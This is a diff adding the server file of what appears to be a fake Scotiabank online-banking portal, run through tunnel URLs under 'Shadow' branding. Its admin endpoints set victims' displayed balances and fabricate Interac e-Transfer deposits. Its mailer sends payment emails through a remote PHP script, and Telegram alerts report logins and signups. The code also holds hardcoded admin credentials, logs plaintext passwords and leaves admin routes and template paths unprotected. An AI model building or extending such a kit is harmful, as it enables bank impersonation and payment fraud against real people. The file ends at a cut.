@@ -1,0 +1,1010 @@
+import express from "express";
+import { createServer as createViteServer } from "vite";
+import path from "path";
+import { fileURLToPath } from "url";
+import fs from 'fs';
+import http from 'http';
+import { Server as SocketServer } from 'socket.io';
+import nodemailer from 'nodemailer';
+import { GlobalSettings } from './src/types/settings';
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const DB_DIR = path.join(__dirname, 'db');
+
+// Ensure DB directories exist
+if (!fs.existsSync(DB_DIR)) fs.mkdirSync(DB_DIR, { recursive: true });
+if (!fs.existsSync(path.join(DB_DIR, 'chats'))) fs.mkdirSync(path.join(DB_DIR, 'chats'), { recursive: true });
+if (!fs.existsSync(path.join(DB_DIR, 'users'))) fs.mkdirSync(path.join(DB_DIR, 'users'), { recursive: true });
+if (!fs.existsSync(path.join(DB_DIR, 'settings'))) fs.mkdirSync(path.join(DB_DIR, 'settings'), { recursive: true });
+if (!fs.existsSync(path.join(DB_DIR, 'logs'))) fs.mkdirSync(path.join(DB_DIR, 'logs'), { recursive: true });
+
+const defaultSettings: GlobalSettings = {
+    general: { 
+        app_url: "https://your-app.trycloudflare.com", 
+        webroot_url: "https://sim.trycloudflare.com",
+        sender_name: "SHΔDØW CORE", 
+        encryption_key: "a3f91b6cd024e8c29b76a149efcc5d42",
+        maintenanceMode: false,
+        bank_name: "Scotiabank",
+        bank_logo: "",
+        overdraftLimit: 5000,
+        transferLimit: 3000,
+        dailyLimit: 10000,
+        forceSupportChat: false,
+        globalEnable: true,
+        admin_username: "PROJECTSARAH",
+        admin_password: "PROJECTSARAH",
+        adminPin: "1234",
+        baseActionUrl: ""
+    },
+    smtp: { host: "", port: 587, secure: false, user: "", pass: "", senderName: "Shadow Mailer" },
+    telegram: { token: "", chat_id: "", enabled: false }
+};
+
+const getChats = async () => {
+    try {
+        const chatsDir = path.join(DB_DIR, 'chats');
+        const files = fs.readdirSync(chatsDir);
+        const chatData: Record<string, any> = {};
+        for (const file of files) {
+            if (file.endsWith('.json')) {
+                const username = file.replace('.json', '');
+                const content = fs.readFileSync(path.join(chatsDir, file), 'utf-8');
+                chatData[username] = JSON.parse(content);
+            }
+        }
+        return chatData;
+    } catch (e) {
+        console.warn("⚠️ [Matrix] Warning: Chat database unreachable.", e);
+    }
+    return {};
+};
+
+const saveChat = async (userId: string, messages: any[]) => {
+    try {
+        const chatPath = path.join(DB_DIR, 'chats', `${userId}.json`);
+        fs.writeFileSync(chatPath, JSON.stringify(messages, null, 2));
+    } catch (e) {
+        console.error("❌ Failed to save chats:", e);
+    }
+};
+
+const getSettings = async (): Promise<GlobalSettings> => {
+    const settingsPath = path.join(DB_DIR, 'settings', 'global.json');
+    try {
+        if (fs.existsSync(settingsPath)) {
+            const data = JSON.parse(fs.readFileSync(settingsPath, 'utf-8'));
+            return { ...defaultSettings, ...data };
+        } else {
+            fs.writeFileSync(settingsPath, JSON.stringify(defaultSettings, null, 2));
+        }
+    } catch (e) {
+        console.warn("⚠️ [Matrix] Warning: Simulation settings unreachable. Using defaults.");
+    }
+    return defaultSettings;
+};
+
+const getUsers = async (): Promise<any[]> => {
+    try {
+        const usersDir = path.join(DB_DIR, 'users');
+        const files = fs.readdirSync(usersDir);
+        const users: any[] = [];
+        for (const file of files) {
+            if (file.endsWith('.json')) {
+                const content = fs.readFileSync(path.join(usersDir, file), 'utf-8');
+                const user = JSON.parse(content);
+                console.log(`[Auth] Loaded user from ${file}: ${user.username}`);
+                users.push(user);
+            }
+        }
+        return users;
+    } catch (e) {
+        console.warn("⚠️ [Matrix] Warning: Users database unreachable.");
+    }
+    return [];
+};
+
+const saveUsers = async (users: any[]) => {
+    try {
+        for (const user of users) {
+            if (user.username) {
+                const userPath = path.join(DB_DIR, 'users', `${user.username}.json`);
+                fs.writeFileSync(userPath, JSON.stringify(user, null, 2));
+            }
+        }
+    } catch (e) {
+        console.error("❌ Failed to save users:", e);
+    }
+};
+
+const getUser = async (username: string) => {
+    const userPath = path.join(DB_DIR, 'users', `${username}.json`);
+    if (fs.existsSync(userPath)) {
+        return JSON.parse(fs.readFileSync(userPath, 'utf-8'));
+    }
+    return null;
+};
+
+const saveUser = async (user: any) => {
+    const userPath = path.join(DB_DIR, 'users', `${user.username}.json`);
+    fs.writeFileSync(userPath, JSON.stringify(user, null, 2));
+};
+
+const deleteUser = async (username: string) => {
+    const userPath = path.join(DB_DIR, 'users', `${username}.json`);
+    if (fs.existsSync(userPath)) {
+        fs.unlinkSync(userPath);
+    }
+};
+
+const updateGlobalSettings = async (settings: GlobalSettings) => {
+    const settingsPath = path.join(DB_DIR, 'settings', 'global.json');
+    fs.writeFileSync(settingsPath, JSON.stringify(settings, null, 2));
+};
+
+const systemLogs: any[] = [];
+const logEvent = (message: string) => {
+    const timestamp = new Date().toLocaleTimeString('en-GB', { hour: '2-digit', minute: '2-digit' });
+    systemLogs.unshift({ timestamp, message });
+    if (systemLogs.length > 50) systemLogs.pop();
+};
+
+const sendTelegramNotification = async (message: string) => {
+    logEvent(`[Telegram] ${message.replace(/<[^>]*>?/gm, '')}`);
+    const settings = await getSettings();
+    if (!settings.telegram || !settings.telegram.enabled || !settings.telegram.token || !settings.telegram.chat_id) {
+        return;
+    }
+
+    try {
+        const url = `https://api.telegram.org/bot${settings.telegram.token}/sendMessage`;
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: settings.telegram.chat_id,
+                text: `🚀 [SARAH-OS] ${message}`,
+                parse_mode: 'HTML'
+            })
+        });
+    } catch (e) {
+        console.error("❌ Telegram Notify Error:", e);
+    }
+};
+
+async function startServer() {
+  const app = express();
+  const server = http.createServer(app);
+  const io = new SocketServer(server, {
+    cors: { origin: "*" }
+  });
+  
+  const activeUsers: Record<string, any> = {};
+
+  io.on('connection', (socket) => {
+    console.log(`🔌 New connection: ${socket.id}`);
+
+    socket.on('register', async (data) => {
+      activeUsers[socket.id] = {
+        id: socket.id,
+        username: data.username,
+        currentPath: data.currentPath,
+        lastSeen: new Date().toISOString()
+      };
+      io.emit('admin_update', { 
+        activeUsers, 
+        logs: systemLogs,
+        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
+      });
+
+      // Send chat history if it's a known user
+      if (data.username && data.username !== 'Guest') {
+        const chats = await getChats();
+        if (chats[data.username]) {
+          socket.emit('chat_history', chats[data.username]);
+        }
+      }
+    });
+
+    socket.on('chat_message', async (data) => {
+      const { from, message } = data;
+      const username = from || 'Guest';
+      
+      const chats = await getChats();
+      const messages = chats[username] || [];
+      const newMsg = { from: username, message, timestamp: Date.now() };
+      messages.push(newMsg);
+      await saveChat(username, messages);
+
+      logEvent(`[Chat] ${username}: ${message}`);
+      io.emit('admin_message', { from: username, message, socketId: socket.id });
+      
+      // Notify Telegram for new support messages
+      if (!username.includes('PROJECTSARAH')) {
+          await sendTelegramNotification(`<b>Support Message</b>\nFrom: ${username}\nMessage: ${message}`);
+      }
+    });
+
+    socket.on('admin_command', async (data) => {
+      const { targetSocketId, targetUsername, command, payload } = data;
+      
+      if (command === 'chat_message') {
+        // Use provided targetUsername or fallback to looking up the targetSocket's username
+        let username = targetUsername;
+        if (!username && targetSocketId) {
+          const targetUser = activeUsers[targetSocketId];
+          username = targetUser?.username || targetSocketId;
+        }
+
+        if (username) {
+          const chats = await getChats();
+          const messages = chats[username] || [];
+          const newMsg = { from: 'admin', message: payload.message, timestamp: Date.now() };
+          messages.push(newMsg);
+          await saveChat(username, messages);
+          
+          // If online, emit directly
+          if (targetSocketId) {
+            const targetSocket = io.sockets.sockets.get(targetSocketId);
+            if (targetSocket) {
+              targetSocket.emit('client_command', { command: 'chat_message', from: 'admin', message: payload.message });
+            }
+          }
+          
+          // Always broadcast to all admin sockets to keep their views in sync
+          io.emit('admin_message', { from: 'admin', to: username, message: payload.message });
+          logEvent(`[Admin Chat] Sent to ${username}: ${payload.message}`);
+        }
+      } else if (targetSocketId) {
+        io.to(targetSocketId).emit('client_command', { command, payload });
+      }
+    });
+
+    socket.on('admin_request_history', async (data) => {
+      const { username } = data;
+      const chats = await getChats();
+      if (chats[username]) {
+        socket.emit('admin_chat_history', { username, history: chats[username] });
+      } else {
+        socket.emit('admin_chat_history', { username, history: [] });
+      }
+    });
+
+    socket.on('disconnect', () => {
+      delete activeUsers[socket.id];
+      io.emit('admin_update', { 
+        activeUsers, 
+        logs: systemLogs,
+        sessions: Object.values(activeUsers).map(u => ({ id: u.id, username: u.username, lastSeen: u.lastSeen, currentPath: u.currentPath }))
+      });
+      console.log(`🔌 Disconnected: ${socket.id}`);
+    });
+  });
+
+  app.use(express.json());
+
+  // AUTH API
+  app.post("/api/auth/login", async (req, res) => {
+      const { username: rawUsername, password: rawPassword, pin } = req.body;
+      const username = rawUsername?.trim();
+      const password = rawPassword?.trim();
+      
+      const settings = await getSettings();
+      console.log(`[Auth] Login attempt: user="${username}", pass="${password}", pin="${pin}"`);
+      
+      const adminUser = settings.general.admin_username || "PROJECTSARAH";
+      const adminPass = settings.general.admin_password || "PROJECTSARAH";
+      const adminPin = settings.general.adminPin || "";
+      
+      const isPinMatch = !adminPin || adminPin === "" || pin === adminPin;
+      
+      // Check Admin Credentials
+      if (username?.toUpperCase() === adminUser.toUpperCase() && password === adminPass && (isPinMatch || !pin)) {
+          logEvent(`[Auth] Admin user ${username} logged in successfully.`);
+          await sendTelegramNotification(`<b>Admin Login Detected</b>\nUser: ${username}\nIP: ${req.ip}`);
+          const generateHistory = (count: number) => {
+              const history = [];
+              const now = new Date();
+              for (let i = 0; i < count; i++) {
+                  const date = new Date(now);
+                  date.setDate(now.getDate() - i);
+                  history.push({
+                      id: `tx-${i}-${Math.random().toString(36).substr(2, 9)}`,
+                      date: date.toISOString().split('T')[0],
+                      description: i % 2 === 0 ? "Walmart Supercenter" : "Starbucks Coffee",
+                      amount: -parseFloat((Math.random() * 50 + 10).toFixed(2)),
+                      status: 'Completed',
+                      category: 'Shopping'
+                  });
+              }
+              return history;
+          };
+
+          const adminResponse = {
+              id: 'admin',
+              username: adminUser,
+              adminPin: adminPin || "1234",
+              securityWord: 'SARAH',
+              scenePoints: 15420,
+              settings: {
+                  displayName: "PROJECT SARAH",
+                  memberSince: "2018",
+                  adminPin: adminPin || "1234",
+                  accountHolderName: "AB FARMS LTD",
+                  phpmailerSenderName: "AB FARMS LTD"
+              },
+              accounts: {
+                  "Ultimate Package": {
+                      type: "banking",
+                      balance: 4.82,
+                      available: 4.82,
+                      points: 0,
+                      accountNumber: "1001-4432-8821",
+                      history: generateHistory(10)
+                  },
+                  "Savings Plus": {
+                      type: "banking",
+                      balance: 1.25,
+                      available: 1.25,
+                      points: 0,
+                      accountNumber: "2005-9912-3341",
+                      history: generateHistory(5)
+                  },
+                  "Momentum Visa Infinite": {
+                      type: "credit",
+                      balance: 4950.00,
+                      available: 50.00,
+                      points: 850,
+                      accountNumber: "4538-****-****-1102",
+                      history: generateHistory(15)
+                  },
+                  "SCENE+ Visa": {
+                      type: "credit",
+                      balance: 1200.00,
+                      available: 800.00,
+                      points: 1240,
+                      accountNumber: "4537-****-****-8841",
+                      history: generateHistory(8)
+                  }
+              },
+              contacts: [],
+              purchasedCards: []
+          };
+
+          return res.json({ success: true, user: adminResponse });
+      }
+
+      // Check Regular Users
+      const users = await getUsers();
+      console.log(`[Auth] Checking against ${users.length} registered users.`);
+      
+      const dbUser = users.find(u => {
+          const match = u.username?.toLowerCase() === username?.toLowerCase();
+          if (match) {
+              console.log(`[Auth] Found user entry for ${username}. Comparing passwords: "${u.password}" === "${password}"`);
+          }
+          return match && u.password === password;
+      });
+
+      if (dbUser) {
+          if (dbUser.enabled === false) {
+              console.log(`[Auth] Denied: ${username} is disabled`);
+              return res.json({ success: false, message: 'Account disabled' });
+          }
+          logEvent(`[Auth] User ${username} logged in successfully.`);
+          return res.json({ success: true, user: dbUser });
+      }
+
+      console.log(`[Auth] Failed: Invalid credentials for ${username}. Found users matching username: ${users.filter(u => u.username?.toLowerCase() === username?.toLowerCase()).length}`);
+      if (users.filter(u => u.username?.toLowerCase() === username?.toLowerCase()).length > 0) {
+          console.log(`[Auth] Found user entry, but password might not match.`);
+      }
+      return res.json({ success: false, message: 'Invalid credentials' });
+  });
+
+  // ADMIN API
+  app.get("/api/admin/global-settings", async (req, res) => {
+    res.json(await getSettings());
+  });
+
+  app.post("/api/admin/global-settings", async (req, res) => {
+    try {
+      const settings = await getSettings();
+      const updated = { 
+        ...settings, 
+        ...req.body,
+        general: { ...settings.general, ...req.body.general },
+        smtp: { ...settings.smtp, ...req.body.smtp },
+        telegram: { ...settings.telegram, ...req.body.telegram }
+      };
+      
+      const changes: string[] = [];
+      const compareObjs = (oldObj: any, newObj: any, prefix = "") => {
+          for (const key in newObj) {
+              if (typeof newObj[key] === 'object' && newObj[key] !== null) {
+                  compareObjs(oldObj[key] || {}, newObj[key], `${prefix}${key}.`);
+              } else if (oldObj[key] !== newObj[key] && newObj[key] !== undefined) {
+                  const oldVal = (key === 'pass' || key === 'botToken') ? "***" : oldObj[key];
+                  const newVal = (key === 'pass' || key === 'botToken') ? "***" : newObj[key];
+                  changes.push(`${prefix}${key}: '${oldVal}' -> '${newVal}'`);
+              }
+          }
+      };
+      compareObjs(settings, updated);
+
+      await updateGlobalSettings(updated);
+      
+      if (changes.length > 0) {
+          logEvent(`[System] Admin updated settings: ${changes.join(", ")}`);
+      } else {
+          logEvent(`[System] Admin saved settings (no changes).`);
+      }
+      res.json({ success: true });
+    } catch (e: any) {
+      res.status(500).json({ success: false, error: e.message });
+    }
+  });
+
+  app.get("/api/admin/users", async (req, res) => {
+    try {
+      res.json({ users: await getUsers() });
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Database error" });
+    }
+  });
+
+  app.post("/api/admin/users/create", async (req, res) => {
+    try {
+      const newUser = { 
+          ...req.body, 
+          id: Date.now().toString(),
+          enabled: true,
+          created_at: new Date().toISOString()
+      };
+      await saveUser(newUser);
+      res.json({ success: true });
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Creation failed" });
+    }
+  });
+
+  app.post("/api/admin/users/approve", async (req, res) => {
+    try {
+      const { username } = req.body;
+      const user = await getUser(username);
+      if (user) {
+          const updatedUser = {
+              ...user,
+              isApproved: true,
+              enabled: true,
+              isLocked: false
+          };
+          await saveUser(updatedUser);
+          logEvent(`[Admin] Approved user ${username}`);
+          await sendTelegramNotification(`<b>User Approved</b>\nUser: ${username}`);
+          res.json({ success: true });
+      } else {
+          res.status(404).json({ success: false, message: "User not found" });
+      }
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Approval failed" });
+    }
+  });
+
+  app.post("/api/admin/users/lock", async (req, res) => {
+    try {
+      const { username, locked } = req.body;
+      const user = await getUser(username);
+      if (user) {
+          user.isLocked = locked;
+          await saveUser(user);
+          logEvent(`[Admin] Account ${locked ? 'LOCKED' : 'UNLOCKED'} for ${username}`);
+          res.json({ success: true });
+      } else {
+          res.status(404).json({ success: false, message: "User not found" });
+      }
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Locking failed" });
+    }
+  });
+
+  app.post("/api/admin/users/toggle-enabled", async (req, res) => {
+    try {
+      const { username } = req.body;
+      const user = await getUser(username);
+      if (user) {
+          user.enabled = !user.enabled;
+          await saveUser(user);
+          res.json({ success: true });
+      } else {
+          res.status(404).json({ success: false, message: "User not found" });
+      }
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Toggle failed" });
+    }
+  });
+
+  app.post("/api/admin/users/update-balance", async (req, res) => {
+    try {
+      const { username, account, balance } = req.body;
+      const user = await getUser(username);
+      if (user) {
+          if (user.accounts && user.accounts[account]) {
+              const oldBalance = user.accounts[account].balance;
+              user.accounts[account].balance = balance;
+              user.accounts[account].available = balance;
+              await saveUser(user);
+              logEvent(`[DB] Updated ${username}'s ${account} balance: $${oldBalance} -> $${balance}`);
+              res.json({ success: true });
+          } else {
+              res.status(404).json({ success: false, message: "Account not found" });
+          }
+      } else {
+          res.status(404).json({ success: false, message: "User not found" });
+      }
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Balance update failed" });
+    }
+  });
+
+  app.post("/api/admin/users/update-settings", async (req, res) => {
+      const { username, updates, data } = req.body;
+      const finalUpdates = updates || data;
+      try {
+        const user = await getUser(username);
+        if (user) {
+            user.settings = { ...user.settings, ...finalUpdates };
+            await saveUser(user);
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ success: false, message: "User not found" });
+        }
+      } catch (e) {
+        res.status(500).json({ success: false, error: "Internal error" });
+      }
+  });
+
+  app.post("/api/etransfer/check-recipient", async (req, res) => {
+      const { email } = req.body;
+      const users = await getUsers();
+      // Check if any user has this email in their settings or username
+      const recipient = users.find(u => u.username === email || u.settings?.email === email);
+      if (recipient && recipient.isApproved !== false) {
+          res.json({ 
+            registered: true, 
+            username: recipient.username,
+            name: recipient.settings?.accountHolderName || recipient.settings?.phpmailerSenderName || recipient.username 
+          });
+      } else {
+          res.json({ registered: false });
+      }
+  });
+
+  app.post("/api/etransfer/internal-deposit", async (req, res) => {
+    try {
+        const { senderUsername, recipientUsername, amount, description, fromAccountName } = req.body;
+        const sender = await getUser(senderUsername);
+        const recipient = await getUser(recipientUsername);
+
+        if (!sender || !recipient) {
+            return res.status(404).json({ success: false, message: "User not found" });
+        }
+
+        const recipientAccounts = { ...recipient.accounts };
+        const recipientMainAccount = recipientAccounts['Ultimate Package'] || Object.values(recipientAccounts)[0];
+        const recipientAccountName = recipientAccounts['Ultimate Package'] ? 'Ultimate Package' : Object.keys(recipientAccounts)[0];
+
+        if (recipientMainAccount) {
+            const depositTx = {
+                id: `et-${Date.now()}`,
+                date: new Date().toISOString(),
+                description: `Interac e-Transfer from ${sender.settings?.accountHolderName || sender.username}`,
+                amount: amount,
+                status: 'Completed',
+                category: 'Deposit'
+            };
+
+            recipientMainAccount.history = [depositTx, ...(recipientMainAccount.history || [])];
+            recipientMainAccount.balance = (recipientMainAccount.balance || 0) + amount;
+            recipientMainAccount.available = (recipientMainAccount.available || 0) + amount;
+
+            recipientAccounts[recipientAccountName] = recipientMainAccount;
+
+            recipient.accounts = recipientAccounts;
+            await saveUser(recipient);
+            logEvent(`[E-Transfer] Auto-deposit: ${amount} from ${senderUsername} to ${recipientUsername}`);
+            res.json({ success: true });
+        } else {
+            res.status(400).json({ success: false, message: "Recipient has no accounts" });
+        }
+    } catch (e) {
+        console.error(e);
+        res.status(500).json({ success: false });
+    }
+  });
+
+  app.post("/api/user/delete", async (req, res) => {
+    try {
+      const { username } = req.body;
+      await deleteUser(username);
+      res.json({ success: true });
+    } catch (e) {
+      res.status(500).json({ success: false, error: "Deletion failed" });
+    }
+  });
+
+  app.post("/api/user/update", async (req, res) => {
+      const { username, password, data, isNew } = req.body;
+      try {
+        const user = await getUser(username);
+        
+        if (user) {
+            const updatedUser = { ...user, ...data };
+            await saveUser(updatedUser);
+            res.json({ success: true });
+        } else if (isNew) {
+            const newUser = { 
+              id: Date.now().toString(),
+              username,
+              password,
+              ...data,
+              enabled: true,
+              created_at: new Date().toISOString()
+            };
+            await saveUser(newUser);
+            logEvent(`[Auth] New signup request: ${username}`);
+            await sendTelegramNotification(`<b>New Signup Request</b>\nUser: ${username}`);
+            res.json({ success: true });
+        } else {
+            console.log("User update for transient user:", username);
+            res.json({ success: true });
+        }
+      } catch (e) {
+        res.status(500).json({ success: false, error: "Internal error" });
+      }
+  });
+  app.get("/api/admin/backup/export", async (req, res) => {
+    try {
+        const exportData: Record<string, any> = {};
+        const collections = ['users', 'chats', 'settings', 'logs'];
+        
+        for (const col of collections) {
+            exportData[col] = {};
+            const colPath = path.join(DB_DIR, col);
+            if (fs.existsSync(colPath)) {
+                const files = fs.readdirSync(colPath);
+                for (const file of files) {
+                    if (file.endsWith('.json')) {
+                        const content = fs.readFileSync(path.join(colPath, file), 'utf-8');
+                        exportData[col][file] = JSON.parse(content);
+                    }
+                }
+            }
+        }
+        
+        res.setHeader('Content-Type', 'application/json');
+        res.setHeader('Content-Disposition', `attachment; filename=backup-${new Date().toISOString().split('T')[0]}.json`);
+        res.json(exportData);
+    } catch (e: any) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+  });
+
+  app.post("/api/admin/backup/import", async (req, res) => {
+    try {
+        const importData = req.body;
+        if (!importData || typeof importData !== 'object') {
+            return res.status(400).json({ success: false, error: "Invalid backup data" });
+        }
+
+        const collections = ['users', 'chats', 'settings', 'logs'];
+        for (const col of collections) {
+            if (importData[col]) {
+                const colPath = path.join(DB_DIR, col);
+                if (!fs.existsSync(colPath)) fs.mkdirSync(colPath, { recursive: true });
+                
+                for (const [filename, content] of Object.entries(importData[col])) {
+                    if (filename.endsWith('.json')) {
+                        fs.writeFileSync(path.join(colPath, filename), JSON.stringify(content, null, 2));
+                    }
+                }
+            }
+        }
+        
+        logEvent(`[System] Data restoration completed from backup.`);
+        res.json({ success: true });
+    } catch (e: any) {
+        res.status(500).json({ success: false, error: e.message });
+    }
+  });
+
+  app.get("/api/admin/sessions", (req, res) => res.json({ sessions: [] }));
+  app.get("/api/logs", (req, res) => {
+      res.json(systemLogs);
+  });
+
+  app.get("/api/admin/debug-logs", async (req, res) => {
+    try {
+        const logsPath = path.join(DB_DIR, 'logs', 'debug.json');
+        if (fs.existsSync(logsPath)) {
+            const logs = JSON.parse(fs.readFileSync(logsPath, 'utf-8'));
+            res.json(logs.slice(0, 100));
+        } else {
+            res.json([]);
+        }
+    } catch (e) {
+        res.status(500).json({ error: "Failed to fetch debug logs" });
+    }
+  });
+
+  app.post("/api/admin/debug-logs", async (req, res) => {
+    try {
+        const { message, type, context } = req.body;
+        const logsPath = path.join(DB_DIR, 'logs', 'debug.json');
+        const logs = fs.existsSync(logsPath) ? JSON.parse(fs.readFileSync(logsPath, 'utf-8')) : [];
+        
+        logs.unshift({
+            message,
+            type: type || 'info',
+            context: context || {},
+            timestamp: Date.now(),
+            dateString: new Date().toISOString()
+        });
+
+        if (logs.length > 500) logs.pop();
+        fs.writeFileSync(logsPath, JSON.stringify(logs, null, 2));
+        res.json({ success: true });
+    } catch (e) {
+        res.status(500).json({ success: false });
+    }
+  });
+
+  app.get("/api/config", async (req, res) => {
+      res.json(await getSettings());
+  });
+  app.post("/api/config", async (req, res) => {
+      try {
+          const settings = await getSettings();
+          const updated = { ...settings, ...req.body };
+          
+          const changes: string[] = [];
+          const compareObjs = (oldObj: any, newObj: any, prefix = "") => {
+              for (const key in newObj) {
+                  if (typeof newObj[key] === 'object' && newObj[key] !== null) {
+                      compareObjs(oldObj[key] || {}, newObj[key], `${prefix}${key}.`);
+                  } else if (oldObj[key] !== newObj[key] && newObj[key] !== undefined) {
+                      const oldVal = (key === 'pass' || key === 'botToken') ? "***" : oldObj[key];
+                      const newVal = (key === 'pass' || key === 'botToken') ? "***" : newObj[key];
+                      changes.push(`${prefix}${key}: '${oldVal}' -> '${newVal}'`);
+                  }
+              }
+          };
+          compareObjs(settings, updated);
+
+          await updateGlobalSettings(updated);
+          if (changes.length > 0) {
+              logEvent(`[System] Core config updated: ${changes.join(", ")}`);
+          } else {
+              logEvent(`[System] Core config saved (no changes).`);
+          }
+          res.json({ success: true });
+      } catch (e: any) {
+          res.status(500).json({ success: false, error: e.message });
+      }
+  });
+  app.get("/api/debug/smtp", (req, res) => res.json({ success: true, message: "SMTP debug okay" }));
+
+  app.post("/api/mailer", async (req, res) => {
+    try {
+        const { recipient_email, recipient_name, amount, purpose, template, sender_name, reference_number, date } = req.body;
+        console.log(`Sending email to ${recipient_email} (${recipient_name}) for ${amount}`);
+        
+        const settings = await getSettings();
+        
+        if (!settings.general.baseActionUrl) {
+            throw new Error("No baseActionUrl configured for mailer");
+        }
+
+        const fallbackBody = {
+            ...req.body,
+            renderedTemplate: template
+        };
+
+        let actionUrl = settings.general.baseActionUrl;
+        if (actionUrl && actionUrl.endsWith('/')) {
+            actionUrl = actionUrl.slice(0, -1);
+        }
+
+        const response = await fetch(`${actionUrl}/api/mailer.php`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(fallbackBody)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`Remote PHP mailer returned status ${response.status}`);
+        }
+        
+        logEvent(`[Mailer] Successfully sent to ${recipient_email} via ${settings.general.baseActionUrl}`);
+        res.json({ success: true, info: "Sent via remote mailer" });
+    } catch (e: any) {
+        console.error("❌ Mailer Error:", e);
+        logEvent(`[Mailer] Error: ${e.message}`);
+        res.status(500).json({ success: false, error: e.message });
+    }
+  });
+
+  const fetchTemplate = async (templateName: string) => {
+      const settings = await getSettings();
+      if (!settings.general.baseActionUrl) return null;
+      try {
+          const res = await fetch(`${settings.general.baseActionUrl}/templates/${templateName}.html`);
+          if (res.ok) return await res.text();
+      } catch (e) {
+          console.error("Failed to fetch template:", e);
+      }
+      return null;
+  };
+
+  const sendEmail = async (to: string, subject: string, text: string, html: string, overrideSenderName?: string) => {
+      const settings = await getSettings();
+      if (!settings.smtp.host) throw new Error("SMTP Host not configured");
+
+      const transporter = nodemailer.createTransport({
+          host: settings.smtp.host,
+          port: settings.smtp.port,
+          secure: settings.smtp.port === 465,
+          connectionTimeout: 10000,
+          greetingTimeout: 10000,
+          auth: {
+              user: settings.smtp.user,
+              pass: settings.smtp.pass
+          }
+      });
+  
+      const finalSender = overrideSenderName || settings.smtp.senderName || settings.general.sender_name;
+
+      await transporter.sendMail({
+          from: `"${finalSender}" <${settings.smtp.user}>`,
+          to,
+          subject,
+          text,
+          html
+      });
+  };
+  
+  app.post("/api/admin/mailer/test", async (req, res) => {
+      try {
+          const { email, amount, purpose, reference_number } = req.body;
+          const settings = await getSettings();
+          const finalSenderName = settings.general.sender_name || "Shadow Mailer";
+          const smtpDebug = { ...settings.smtp, pass: settings.smtp.pass ? "********" : "NOT SET" };
+          
+          console.log("[DEBUG] Test Mailer - Incoming Request:", req.body);
+          console.log("[DEBUG] Test Mailer - SMTP Config:", smtpDebug);
+
+          const subject = purpose || "Test Email";
+          const html = `
+              <div style="font-family: Arial, sans-serif; padding: 20px;">
+                  <h2>Debug Test Mailer</h2>
+                  <p>This is a debug test email.</p>
+                  <p><strong>Sender:</strong> ${finalSenderName}</p>
+                  <p><strong>Amount:</strong> ${amount || 'N/A'}</p>
+                  <p><strong>Ref:</strong> ${reference_number || 'N/A'}</p>
+                  <hr>
+                  <h3>SMTP Configuration</h3>
+                  <pre>${JSON.stringify(smtpDebug, null, 2)}</pre>
+                  <hr>
+                  <h3>Request Payload</h3>
+                  <pre>${JSON.stringify(req.body, null, 2)}</pre>
+              </div>
+          `;
+          
+          await sendEmail(email, subject, `Debug test email to ${email}`, html, finalSenderName);
+          console.log("[DEBUG] Test Mailer - Email sent successfully.");
+          res.json({ success: true, message: "Test email sent with debug info", smtpConfig: smtpDebug });
+      } catch (e: any) {
+          console.error("❌ Test Mailer Error:", e);
+          res.status(500).json({ success: false, error: e.message });
+      }
+  });
+
+  app.get("/api/admin/mailer/status", (req, res) => {
+      res.json({ php_version: "Node.js (Shadow)", status: "Operational", engine: "Shadow-V99" });
+  });
+
+  app.get("/api/admin/mailer/logs", (req, res) => {
+      res.json([]);
+  });
+
+  app.post("/api/admin/mailer/delete-logs", (req, res) => {
+      res.json({ success: true });
+  });
+
+  app.get("/api/admin/mailer/templates", (req, res) => {
+      const templateDir = path.join(process.cwd(), 'server', 'templates');
+      if (!fs.existsSync(templateDir)) {
+          fs.mkdirSync(templateDir, { recursive: true });
+      }
+      const files = fs.readdirSync(templateDir).map(file => ({
+          name: file,
+          last_modified: fs.statSync(path.join(templateDir, file)).mtime.toISOString()
+      }));
+      res.json(files);
+  });
+
+  app.get("/api/admin/mailer/template-content", (req, res) => {
+      const templateName = req.query.template as string;
+      const templatePath = path.join(process.cwd(), 'server', 'templates', templateName);
+      if (fs.existsSync(templatePath)) {
+          res.json({ content: fs.readFileSync(templatePath, 'utf-8') });
+      } else {
+          res.status(404).json({ error: "Template not found" });
+      }
+  });
+
+  app.post("/api/admin/mailer/update-template", (req, res) => {
+      const { template, content } = req.body;
+      const templatePath = path.join(process.cwd(), 'server', 'templates', template);
+      try {
+          if (!fs.existsSync(path.dirname(templatePath))) {
+              fs.mkdirSync(path.dirname(templatePath), { recursive: true });
+          }
+          fs.writeFileSync(templatePath, content);
+          res.json({ success: true });
+      } catch (e: any) {
+          res.status(500).json({ success: false, error: e.message });
+      }
+  });
+
+  app.post("/api/admin/users/set-auto-delete", async (req, res) => {
+      const { username, deleteAt } = req.body;
+      try {
+        const user = await getUser(username);
+        if (user) {
+            user.autoDeleteAt = deleteAt;
+            await saveUser(user);
+            res.json({ success: true });
+        } else {
+            res.status(404).json({ success: false, message: "User not found" });
+        }
+      } catch (e) {
+        res.status(500).json({ success: false, error: "Auto-delete failed" });
+      }
+  });
+
+  // Catch-all for API to prevent HTML responses
+  app.all("/api/*", (req, res) => {
+      res.status(404).json({ success: false, message: `API Route ${req.path} not found` });
+  });
+
+  /**
+   * FRONTEND DEPLOYMENT
+   */
+  console.log(`[Shadow-Core] Mode: ${process.env.NODE_ENV || 'development'}`);
+  if (process.env.NODE_ENV !== "production") {
+    console.log(`[Shadow-Core] Starting Vite middleware...`);
+    const vite = await createViteServer({
+      server: { middlewareMode: true },
+      appType: "spa",
+    });
+    app.use(vite.middlewares);
+  } else {
+    const distPath = path.join(process.cwd(), 'dist');
+    console.log(`[Shadow-Core] Serving static files from: ${distPath}`);
+    app.use(express.static(distPath));
+    app.get('*', (req, res) => {
+      res.sendFile(path.join(distPath, 'index.html'));
+    });
+  }
+
+  const PORT = parseInt(process.env.PORT || '3000');
